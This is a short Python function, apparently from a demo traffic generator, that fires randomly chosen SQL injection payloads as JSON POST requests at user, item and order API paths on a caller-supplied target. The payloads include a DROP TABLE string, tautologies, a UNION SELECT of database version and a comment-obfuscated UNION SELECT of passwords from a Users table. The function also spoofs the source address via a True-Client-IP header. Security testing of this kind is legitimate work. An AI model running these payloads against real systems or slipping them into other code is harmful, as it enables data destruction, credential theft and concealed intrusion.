import random
import requests

# SQLi attempts (JSON POSTs)
def api_demo_sql_injection(target, source_ip, user_agent, **kwargs):

    #common paths + params
    paths =   [
                "/api/v1/users/",
                "/api/v1/items/",
                "/api/v1/orders/"
              ]
    #generic sqli
    attacks = [
                "Robert');DROP TABLE Students;--",
                "wpcon'' and 1=(/**/sElEcT 0)-- -'A=0' or 1=ctxsys.drithsx.sn(1,(chr(33)||chr' or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- 'x'='x",
                "and 1=(/**/sElEcT 0)-- -'A=0' or 1=ctxsys.drithsx.sn(1,(chr(33)||chr2121121121212.1",
                "1' or '1' = '1",
                ";UNION SELECT 1, version() limit 1,1--",
                "'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--"
              ]


    headers = {'User-Agent': user_agent,
               'True-Client-IP': str(source_ip),
               'Content-Type': 'application/json'
              }

    count=random.randint(1,5)
    ret=""

    for i in range(count):

        # pick a random path and attack to try
        attack = random.choice(attacks)
        path = random.choice(paths)

        req = {
                   "method": "POST",
                   "url": "{}{}".format(target,path),
                   "payload": {"id":5,"name":"{}".format(attack)}
                 }

        response = requests.request(req['method'], req['url'], headers=headers, json=req['payload']).status_code
        ret += "api_demo_sql_injection: got {} with {}\n".format(response,req['url'])

    return(ret)
